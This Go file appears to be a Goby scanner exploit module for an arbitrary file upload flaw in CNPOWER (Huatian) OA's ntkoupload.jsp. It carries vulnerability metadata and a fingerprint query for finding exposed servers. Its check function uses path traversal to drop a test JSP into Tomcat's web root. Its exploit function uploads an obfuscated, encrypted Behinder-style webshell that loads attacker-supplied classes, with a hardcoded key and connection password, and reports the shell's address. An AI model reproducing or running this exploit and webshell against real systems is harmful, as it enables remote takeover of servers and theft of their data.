package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "CNPOWER OA ntkoupload.jsp Arbitrary File Upload Vulnerability",
    "Description": "<p>Huatian power collaborative office system combines advanced management ideas, management modes, software technology and network technology to provide users with a low-cost and efficient collaborative office and management platform. Wise managers have achieved good results in strengthening standardized workflow, strengthening team execution, promoting fine management and promoting business growth through the use of Huatian power collaborative office platform.</p><p>There is an arbitrary file upload vulnerability in Huatian power OA ntkoupload.jsp . Attackers can upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.</p>",
    "Product": "CNPOWER-OA",
    "Homepage": "http://www.oa8000.com/",
    "DisclosureDate": "2022-07-22",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "GobyQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "Level": "2",
    "Impact": "<p>There is an arbitrary file upload vulnerability in Huatian power OA ntkoupload.jsp . Attackers can upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "http://www.oa8000.com"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "华天动力 OA ntkoupload.jsp 任意文件上传漏洞",
            "Product": "华天动力-OA",
            "Description": "<p>华天动力协同办公系统将先进的管理思想、管理模式和软件技术、网络技术相结合，为用户提供了低成本、高效能的协同办公和管理平台。睿智的管理者通过使用华天动力协同办公平台，在加强规范工作流程、强化团队执行、推动精细管理、促进营业增长等工作中取得了良好的成效。<br></p><p>华天动力 OA ntkoupload.jsp 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>华天动力 OA ntkoupload.jsp 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "CNPOWER OA ntkoupload.jsp Arbitrary File Upload Vulnerability",
            "Product": "CNPOWER-OA",
            "Description": "<p>Huatian power collaborative office system combines advanced management ideas, management modes, software technology and network technology to provide users with a low-cost and efficient collaborative office and management platform. Wise managers have achieved good results in strengthening standardized workflow, strengthening team execution, promoting fine management and promoting business growth through the use of Huatian power collaborative office platform.<br></p><p>There is an arbitrary file upload vulnerability in Huatian power OA ntkoupload.jsp . Attackers can upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in Huatian power OA ntkoupload.jsp . Attackers can upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := fmt.Sprintf("/OAapp/jsp/trace/ntkoupload.jsp")
			cfg1 := httpclient.NewPostRequestConfig(uri)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Referer", u.FixedHostInfo+"/OAapp/htpages/app/module/portal_FLOW/view/8.0MainPor.jsp")
			resp, err := httpclient.DoHttpRequest(u, cfg1)
			if err != nil {
				return false
			}
			if resp.StatusCode != 200 {
				return false
			}
			filename := goutils.RandomHexString(5) + ".jsp"
			fileContent := `<%@ page language="java" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>JSP - Hello World Tutorial - Programmer Gate</title>
</head>
<body>
<%= "Hello World!" %>
</body>
</html>`
			uri = fmt.Sprintf("/OAapp/jsp/trace/ntkoupload.jsp?filename=../../../../../../../../../../../../../../../../../../htoa8/Tomcat/webapps/ROOT/%s&filePath=a", filename)
			cfg1 = httpclient.NewPostRequestConfig(uri)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Referer", u.FixedHostInfo+"/OAapp/htpages/app/module/portal_FLOW/view/8.0MainPor.jsp")
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------72079808033019838393943971869")
			cfg1.Data = fmt.Sprintf("-----------------------------72079808033019838393943971869\r\nContent-Disposition: form-data; name=\"fileUpload\"; filename=\"a.b.c.d\"\r\nContent-Type: text/plain\r\n\r\n%s\r\n\r\n-----------------------------72079808033019838393943971869\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n\r\n-----------------------------72079808033019838393943971869\r\nContent-Disposition: form-data; name=\"userShowId\"\r\n\r\nadmin\r\n-----------------------------72079808033019838393943971869\r\nContent-Disposition: form-data; name=\"uploadToFileSend\"\r\n\r\ntrue\r\n-----------------------------72079808033019838393943971869--", fileContent)
			resp, err = httpclient.DoHttpRequest(u, cfg1)
			if err != nil {
				return false
			}
			time.Sleep(time.Second * 1)
			cfg1 = httpclient.NewGetRequestConfig("/" + filename)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			resp, err = httpclient.DoHttpRequest(u, cfg1)
			if err != nil {
				return false
			}
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Hello World") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := fmt.Sprintf("/OAapp/jsp/trace/ntkoupload.jsp")
			cfg1 := httpclient.NewPostRequestConfig(uri)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Referer", expResult.HostInfo.FixedHostInfo+"/OAapp/htpages/app/module/portal_FLOW/view/8.0MainPor.jsp")
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1)
			if err != nil {
				return expResult
			}
			if resp.StatusCode != 200 {
				return expResult
			}
			filename := goutils.RandomHexString(5) + ".jsp"
			fileContent := `<%@page import="sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random" %>
<%!
    class tas9erMc8mqNMTv extends \u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 {
        tas9erMc8mqNMTv(\u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 tas9erZqjG2ueUP) {
            super(tas9erZqjG2ueUP);
        }
        public Class tas9erVbMfv21Uj(byte[] tas9er8bapoeX8l) {
            return super.d\uuuuuuuuu0065fineClass(tas9er8bapoeX8l,0,tas9er8bapoeX8l.length);
        }
    }
%><%
    out.println("Random Garbage Data:");
    Random tas9er9H5B38ZVj = new Random();
    int tas9erd6S024kkH = tas9er9H5B38ZVj.nextInt(1234);
    int tas9eruj2mccEYu = tas9er9H5B38ZVj.nextInt(5678);
    int tas9er6K5HIYWkI = tas9er9H5B38ZVj.nextInt(1357);
    int tas9erweaTdCiUn = tas9er9H5B38ZVj.nextInt(2468);
    out.println(tas9erd6S024kkH+","+tas9eruj2mccEYu+","+tas9er6K5HIYWkI+","+tas9erweaTdCiUn);
    String[] tas9erUBzFLQ6q8 = new String[]{"A", "P", "B", "O", "C", "S", "D", "T"};
    String tas9erjAzQBh17C = tas9erUBzFLQ6q8[1] + tas9erUBzFLQ6q8[3] + tas9erUBzFLQ6q8[5] + tas9erUBzFLQ6q8[7];
    if (request.getMethod().equals(tas9erjAzQBh17C)) {
        String tas9erXQ3MEXRW8 = new String(new B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072().decodeBuffer("MTZhY2FjYzA1YWFmYWY2Nw=="));
        session.setAttribute("u", tas9erXQ3MEXRW8);
        Cipher tas9erWPpoIMnUd = Cipher.getInstance("AES");
        tas9erWPpoIMnUd.init(((tas9erd6S024kkH * tas9eruj2mccEYu + tas9er6K5HIYWkI - tas9erweaTdCiUn) * 0) + 3 - 1, new SecretKeySpec(tas9erXQ3MEXRW8.getBytes(), "AES"));
        new tas9erMc8mqNMTv(this.\u0067\u0065t\u0043\u006c\u0061\u0073\u0073().\u0067\u0065t\u0043\u006c\u0061\u0073\u0073Loader()).tas9erVbMfv21Uj(tas9erWPpoIMnUd.doFinal(new sun.misc.B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%>`
			uri = fmt.Sprintf("/OAapp/jsp/trace/ntkoupload.jsp?filename=../../../../../../../../../../../../../../../../../../htoa8/Tomcat/webapps/ROOT/%s&filePath=a", filename)
			cfg1 = httpclient.NewPostRequestConfig(uri)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Referer", expResult.HostInfo.FixedHostInfo+"/OAapp/htpages/app/module/portal_FLOW/view/8.0MainPor.jsp")
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------72079808033019838393943971869")
			cfg1.Data = fmt.Sprintf("-----------------------------72079808033019838393943971869\r\nContent-Disposition: form-data; name=\"fileUpload\"; filename=\"a.b.c.d\"\r\nContent-Type: text/plain\r\n\r\n%s\r\n\r\n-----------------------------72079808033019838393943971869\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n\r\n-----------------------------72079808033019838393943971869\r\nContent-Disposition: form-data; name=\"userShowId\"\r\n\r\nadmin\r\n-----------------------------72079808033019838393943971869\r\nContent-Disposition: form-data; name=\"uploadToFileSend\"\r\n\r\ntrue\r\n-----------------------------72079808033019838393943971869--", fileContent)
			resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg1)
			if err != nil {
				return expResult
			}
			time.Sleep(time.Second * 1)
			cfg1 = httpclient.NewGetRequestConfig("/" + filename)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg1)
			if err != nil {
				return expResult
			}
			if resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = "Webshell Addr: " + expResult.HostInfo.FixedHostInfo + uri + "\nWebshell Pass: Tas9er\nUse Behinder to connect"
			}
			return expResult
		},
	))
}
